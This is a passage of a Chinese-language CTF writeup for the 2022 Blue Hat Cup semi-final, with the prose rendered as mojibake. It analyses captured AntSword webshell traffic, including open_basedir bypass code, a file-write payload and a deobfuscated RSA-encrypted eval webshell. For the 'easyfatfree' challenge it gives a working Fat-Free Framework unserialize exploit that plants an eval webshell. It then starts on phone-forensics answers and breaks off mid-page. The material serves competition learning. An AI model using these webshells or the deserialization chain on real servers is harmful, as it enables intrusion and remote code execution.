class="variable">$ocwd</span>,<span class="title function_ invoke__">sys_get_temp_dir</span>());</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$oparr</span> <span class="keyword">as</span> <span class="variable">$item</span>) &#123;</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">is_writable</span>(<span class="variable">$item</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="variable">$tmdir</span>=<span class="variable">$item</span>.<span class="string">&quot;/.04ec7d2d70b2&quot;</span>;</span><br><span class="line">@<span class="title function_ invoke__">mkdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">if</span>(!@<span class="title function_ invoke__">file_exists</span>(<span class="variable">$tmdir</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="string">&quot;..&quot;</span>);</span><br><span class="line"><span class="variable">$cntarr</span>=@<span class="title function_ invoke__">preg_split</span>(<span class="string">&quot;/\\\\|\//&quot;</span>,<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">sizeof</span>(<span class="variable">$cntarr</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">@<span class="title function_ invoke__">chdir</span>(<span class="string">&quot;..&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">@<span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>,<span class="string">&quot;/&quot;</span>);</span><br><span class="line">@<span class="title function_ invoke__">rmdir</span>(<span class="variable">$tmdir</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="variable">$output</span>=<span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line"><span class="title function_ invoke__">ob_end_clean</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;4947&quot;</span>.<span class="string">&quot;16eb8&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> @<span class="title function_ invoke__">asenc</span>(<span class="variable">$output</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;0fd21&quot;</span>.<span class="string">&quot;b9b2f&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">ob_start</span>();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;jf85b04afff284&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$D</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br></pre></td></tr></table></figure><p>åˆ†æä»£ç å¯çŸ¥ï¼Œbase64æˆªå–ä¸¤ä½åå­—ç¬¦è¿›è¡Œè§£ç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span>@Cat:~$ <span class="built_in">echo</span> <span class="string">&quot;SqQzovcGhwc3R1ZHlfcHJvL1dXVy8=&quot;</span> | <span class="built_in">cut</span> -b 3- | <span class="built_in">base64</span> -d</span><br><span class="line">C:/phpstudy_pro/WWW/</span><br></pre></td></tr></table></figure><p>é‡ç‚¹å…³æ³¨å†™<code>rsa.php</code>æ–‡ä»¶æˆåŠŸçš„è¯·æ±‚ï¼Œå‘ç°å†™æ–‡ä»¶æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$_POST</span>[<span class="string">&quot;o8ef400b0da61f&quot;</span>],<span class="number">2</span>));</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;jf85b04afff284&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æå–æ ¸å¿ƒä»£ç ï¼Œæœ¬åœ°ç¯å¢ƒæ­å»ºï¼Œå†™å…¥æ–‡ä»¶æµ‹è¯•ï¼Œç›®çš„æ˜¯æå–<code>rsa.php</code>æ–‡ä»¶å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$f</span>=<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&quot;b&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\r&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$buf</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$c</span>);<span class="variable">$i</span>+=<span class="number">2</span>)<span class="variable">$buf</span>.=<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%&quot;</span>.<span class="title function_ invoke__">substr</span>(<span class="variable">$c</span>,<span class="variable">$i</span>,<span class="number">2</span>));</span><br><span class="line"><span class="keyword">echo</span>(@<span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="variable">$f</span>,<span class="string">&quot;a&quot;</span>),<span class="variable">$buf</span>)?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>);</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180728692.png" alt="æå–rsa.php"></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804180739604.png" alt="image-20220804180739604"></p><p>å‘ç°æœ‰<code>PHPJiaMi</code>çš„æ··æ·†ï¼Œä½¿ç”¨<a href="https://github.com/wenshui2008/phpjiami_decode">phpjiami_decode</a>è¿›è¡Œå»æ··æ·†ï¼ˆå¾—åˆ°ä»£ç å¦‚ä¸‹ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDieYmLtWbGRSvUtevSlTOozmWR</span></span><br><span class="line"><span class="string">qEGF4Hfvb1YCoVYAAlhnHnyMk+aLRvLXKgmerWiS+QD6y08Ispuzzn02tHE6d4Qp</span></span><br><span class="line"><span class="string">DuPiPO9PAdGSXzFVFLK2hOrkXLsDXugNTdVUprdkPPI1YY0ZnMs1bT2Zf2dfuBI5</span></span><br><span class="line"><span class="string">0S5e5sSOF85kNq/zwwIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$cmds</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = <span class="title function_ invoke__">openssl_pkey_get_public</span>(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="title function_ invoke__">openssl_public_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">     <span class="variable">$_POST</span>[<span class="variable">$k</span>]=<span class="variable">$de</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>); </span><br></pre></td></tr></table></figure><p>æ·»åŠ äº†<code>rsa.php</code>åï¼Œé€šè¿‡æ–°åŠ å¯†åˆå†™å…¥<code>flag.txt</code>æ–‡ä»¶ï¼Œç»“åˆä¸Šé¢è„šæœ¬ï¼Œæ„é€ æµé‡åŒ…çš„è¯·æ±‚ï¼ˆä»£ç æ·»åŠ è¾…åŠ©è°ƒè¯•ä¿¡æ¯ï¼‰ï¼š</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804181457776.png" alt="å¾—åˆ°flag.txt"></p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="1-easyfatfree"><a href="#1-easyfatfree" class="headerlink" title="1. easyfatfree"></a>1. easyfatfree</h3><p>é€šè¿‡æ‰«æï¼Œå‘ç°<code>www.zip</code>ç½‘ç«™æºç </p><p><code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span>=<span class="keyword">require</span>(<span class="string">&#x27;lib/base.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCRE_VERSION&lt;<span class="number">8.0</span>)</span><br><span class="line">    <span class="title function_ invoke__">trigger_error</span>(<span class="string">&#x27;PCRE version is out of date&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;<span class="title function_ invoke__">route</span>(<span class="string">&#x27;GET /&#x27;</span>,</span><br><span class="line">    function(<span class="variable">$f3</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easyfatfree unserialize me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$f3</span>-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›´æ¥å°†GETè¯·æ±‚çš„<code>payload</code>å‚æ•°ååºåˆ—åŒ–, æœç´¢<code>__destruct</code></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804182436949.png" alt="__destruct()"></p><p><code>DBJig</code>ç±»ä¸­çš„<code>__destruct</code>æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">.... <span class="comment">// çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;lazy) &#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;lazy = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;data?:[] <span class="keyword">as</span> <span class="variable">$file</span> =&gt; <span class="variable">$data</span>)</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$file</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>$this-&gt;lazy</code> ä¸ºTrue, é‚£ä¹ˆå°±ä¼šè¿›å…¥<code>$this-&gt;write</code>å‡½æ•°ï¼Œæ­¤å‡½æ•°å‚æ•°æ¥æº<code>$this-&gt;data</code>è¿™ä¸ªæ•°ç»„ï¼Œ</p><p>keyä¸ºæ–‡ä»¶åï¼Œvalueä¸ºæ•°æ®ï¼Œè·Ÿè¿›æŸ¥çœ‹<code>$this-&gt;write</code>å‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="keyword">array</span> <span class="variable">$data</span>=<span class="literal">NULL</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;dir || <span class="variable language_">$this</span>-&gt;lazy)</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">count</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$file</span>]=<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$fw</span>=<span class="title class_">\Base</span>::<span class="title function_ invoke__">instance</span>();</span><br><span class="line"><span class="keyword">switch</span> (<span class="variable language_">$this</span>-&gt;format) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_JSON</span>:</span><br><span class="line"><span class="variable">$out</span>=<span class="title function_ invoke__">json_encode</span>(<span class="variable">$data</span>,JSON_PRETTY_PRINT);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>:</span><br><span class="line"><span class="variable">$out</span>=<span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$fw</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;dir.<span class="variable">$file</span>,<span class="variable">$out</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>$this-&gt;dir</code>ä¸ºç©ºï¼Œæˆ–è€…<code>$this-&gt;lazy</code>ä¸º<code>TRUE</code>ï¼Œåˆ™è¿”å›<code>count($this-&gt;data[$file]=$data)</code>ã€‚å› ä¸ºåœ¨ä¸Šé¢<code>__destruct</code>å‡½æ•°çš„æµç¨‹ä¸­å·²ç»å°†<code>$this-&gt;lazy</code>è®¾ç½®ä¸ºFALSEäº†ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªéœ€è¦æ»¡è¶³<code>$this-&gt;dir</code>ä¸ä¸ºç©ºå³å¯ã€‚æ¥ç€çœ‹switchå¾ªç¯ï¼Œ<code>$this-&gt;format</code>ä¸º<code>0</code>åˆ™è¿›å…¥<code>json_encode</code>ï¼Œ<code>1</code>åˆ™è¿›å…¥<code>serialize</code>ã€‚å› æ­¤æˆ‘ä»¬è®¾ç½®<code>$this-&gt;format</code>ä¸º0å³å¯ï¼Œæ¥ç€è°ƒç”¨<code>Base::instance()</code>ç±»çš„<code>write</code>æ–¹æ³•ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$append</span>=<span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$data</span>,<span class="variable">$this</span>-&gt;hive[<span class="string">&#x27;LOCK&#x27;</span>]|(<span class="variable">$append</span>?<span class="attr">FILE_APPEND</span>:<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†<code>file_put_contents</code>æ¥å†™æ–‡ä»¶ã€‚åˆ†æå°±æ­¤ï¼Œæ„é€ expå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">DB</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Jig</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span></span><br><span class="line">        FORMAT_JSON=<span class="number">0</span>,</span><br><span class="line">        FORMAT_Serialized=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$uuid</span>, <span class="variable">$dir</span>, <span class="variable">$format</span>, <span class="variable">$log</span>, <span class="variable">$data</span>, <span class="variable">$lazy</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lazy=<span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data=[<span class="string">&quot;1.php&quot;</span>=&gt;[<span class="string">&quot;&lt;?php @eval(\$_POST[cmd]);?&gt;&quot;</span>]];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;format=<span class="built_in">self</span>::<span class="variable constant_">FORMAT_Serialized</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;dir=<span class="string">&quot;/var/www/html/lib/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Jig</span>()));</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨ï¼šé»˜è®¤çš„è·¯åŠ²<code>/var/www/html/</code>æ— å†™æƒé™,æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬éœ€è¦æŒ‡å®šè·¯åŠ²</p><p>å½“ç„¶ï¼Œ<code>./lib</code>ä¹Ÿæ˜¯å¯ä»¥çš„</p></blockquote><p>è®¿é—®<code>/lib/1.php</code></p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804183710382.png"></p><h2 id="Forensic"><a href="#Forensic" class="headerlink" title="Forensic"></a>Forensic</h2><h3 id="æ‰‹æœºå–è¯-1"><a href="#æ‰‹æœºå–è¯-1" class="headerlink" title="æ‰‹æœºå–è¯_1"></a>æ‰‹æœºå–è¯_1</h3><p><strong>é¢˜ç›®ï¼šiPhoneæ‰‹æœºçš„iBootå›ºä»¶ç‰ˆæœ¬å·:ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼šiBoot-1.1.1ï¼‰</strong></p><p>ä½¿ç”¨ç›˜å¤çŸ³æ‰‹æœºå–è¯åˆ†æç³»ç»Ÿå¯¼å…¥iphoneæ‰‹æœºçš„zipæ–‡ä»¶,åœ¨è®¾å¤‡ä¿¡æ¯ä¸€æ å¯ä»¥çœ‹åˆ°æ‰‹æœºçš„iBootå›ºä»¶ç‰ˆæœ¬å·</p><p><img src="/2022/08/04/%E7%AC%AC%E5%85%AD%E5%B1%8A%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%85%A8%E5%9B%BD%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B%E5%8D%8A%E5%86%B3%E8%B5%9BWriteup/image-20220804175232682.png"></p><p>flag:iBoot-7429.62.1</p><h3 id="æ‰‹æœºå–è¯-2"><a href="#æ‰‹æœºå–è¯-2" class="headerlink" title="æ‰‹æœºå–è¯_2"></a>æ‰‹æœºå–è¯_2</h3><p><strong>é¢˜ç›®ï¼šè¯¥æ‰‹æœºåˆ¶ä½œå®Œå¤‡ä»½UTC+8çš„æ—¶é—´ï¼ˆéæå–æ—¶é—´ï¼‰:ï¼ˆç­”æ¡ˆå‚è€ƒæ ¼å¼ï¼š2000-01-01 00:00:00ï¼‰</strong></p><p>æ‰“å¼€iphone7.zip,ä¿®æ”¹æ—¥æœŸå³ä¸ºæ‰‹æœºåˆ¶ä½œå®Œå¤‡ä»½çš„æ—¶é—´</p><p><img 